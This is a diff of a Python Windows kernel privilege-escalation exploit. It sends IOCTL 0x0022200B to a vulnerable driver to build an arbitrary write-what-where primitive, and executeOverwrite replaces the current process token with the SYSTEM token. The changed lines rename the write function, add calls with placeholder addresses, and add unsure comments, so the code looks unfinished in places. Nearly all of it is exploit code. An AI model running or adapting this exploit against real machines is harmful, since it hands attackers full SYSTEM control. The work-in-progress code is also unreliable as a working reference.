@@ -177,8 +177,7 @@ def get_PsISP_kernel_address(kernel_base, img_name):
 
 ################################################### WRITE ###########################################################
 
-def writeQWORD(driver, what=0x4141414141414141, where=0x4242424242424242):
-	
+def writePrimitive(driver, what=0x4141414141414141, where=0x4242424242424242):
     what_addr = 0x000000001a001000 # Arbitrary offset inside baseadd
     # Write the what value to what_addr
     data = struct.pack("<Q", what)
@@ -192,20 +191,25 @@ def writeQWORD(driver, what=0x4141414141414141, where=0x4242424242424242):
     data = struct.pack("<Q", what_addr) + struct.pack("<Q", where)
     dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF, 0x000000001a000000, data, len(data), byref(written))
     if dwStatus == 0:
-        print("Something went wrong while writing to memory in the packing section","e")
+        print("Something went wrong while writing to memory in tehe packing section","e")
         sys.exit()
     
+    #IOCTL
     IoControlCode = 0x0022200B
-    InputBuffer = c_void_p(0x000000001a000000)
-    InputBufferLength = 0x10 
+    #Where
+    InputBuffer = what_addr
+    # I THINK this should work? 
+    InputBufferLength = 0x10 # can't take length of a void pointer len(InputBuffer) 
+    # If our buffer length is zero can't we set OutputBuffer to None?
     OutputBuffer = c_void_p(0x0)
+    # The OutputBufferLength is already set to zero. I think we can get rid of this?
     OutputBufferLength = 0x0
     dwBytesReturned = c_ulong()
     lpBytesReturned = byref(dwBytesReturned)
 
-    print "Value before DeviceIoControl: %08x" % cast(0x000000001a002000, POINTER(c_ulonglong))[0]
+    print "Value before DeviceIoControl: %08x" % cast(0x000000001a000000, POINTER(c_ulonglong))[0]
     triggerIOCTL = kernel32.DeviceIoControl(driver, IoControlCode, InputBuffer, InputBufferLength, OutputBuffer, OutputBufferLength, lpBytesReturned, NULL)
-    print "Value after: %08x" % cast(0x000000001a002000, POINTER(c_ulonglong))[0]
+    print "Value after: %08x" % cast(0x000000001a000000, POINTER(c_ulonglong))[0]
     
     return triggerIOCTL
 
@@ -379,6 +383,9 @@ def executeOverwrite():
             current_token = process_base_pointer + TOKEN_OFFSET
 
 
+            what=0x4141414141414141
+            where=0x4242424242424242
+            writePrimitive(driver, what, where)
             # Write the system_token over our current_token for SYSTEM privileges.
             print "MAIN Attempting system to current token overwrite!"
 
@@ -388,4 +395,3 @@ def executeOverwrite():
 ############################################ RUN ################################################
 
 executeOverwrite()
-
